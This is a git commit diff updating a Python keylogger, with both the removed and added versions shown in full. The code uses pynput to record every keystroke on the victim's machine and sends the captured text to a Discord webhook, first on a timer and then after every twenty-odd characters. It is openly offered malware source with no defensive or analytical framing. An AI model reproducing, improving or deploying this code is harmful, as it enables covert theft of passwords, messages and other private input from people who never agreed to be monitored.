fcb94f551699a4fade6ea01d928a1217d58048d0
SAM X86 <samerwleeed@gmail.com>
2025-08-04 17:32:37 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,45 +1,26 @@
-import pynput.keyboard
-import threading
 import requests
-
+from pynput import keyboard
+import threading
 
 class Keylogger:
-    def __init__(self, interval, webhook_url):
+    def __init__(self, webhook):
+        self.webhook = webhook
         self.log = ""
-        self.interval = interval
-        self.webhook_url = webhook_url
 
-    def append_to_log(self, string):
-        self.log += string
-
-    def on_press(self, key):
+    def callback(self, key):
         try:
-            self.append_to_log(key.char)
+            self.log += key.char
         except AttributeError:
-            if key == key.space:
-                self.append_to_log(" ")
-            else:
-                self.append_to_log(" [" + str(key) + "] ")
+            self.log += f' [{key}] '
 
-    def report(self):
-        if self.log.strip() != "":
-            self.send_to_discord(self.log)
-            self.log = ""
-        timer = threading.Timer(self.interval, self.report)
-        timer.daemon = True
-        timer.start()
+        if len(self.log) > 20:
+            self.send_log()
 
-    def send_to_discord(self, message):
-        data = {
-            "content": f"```\n{message}\n```"
-        }
-        try:
-            requests.post(self.webhook_url, json=data)
-        except Exception as e:
-            print(f"Failed to send to Discord: {e}")
+    def send_log(self):
+        requests.post(self.webhook, json={"content": self.log})
+        self.log = ""
 
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
-        with keyboard_listener:
-            self.report()
-            keyboard_listener.join()
+        listener = keyboard.Listener(on_press=self.callback)
+        listener.start()
+        listener.join()
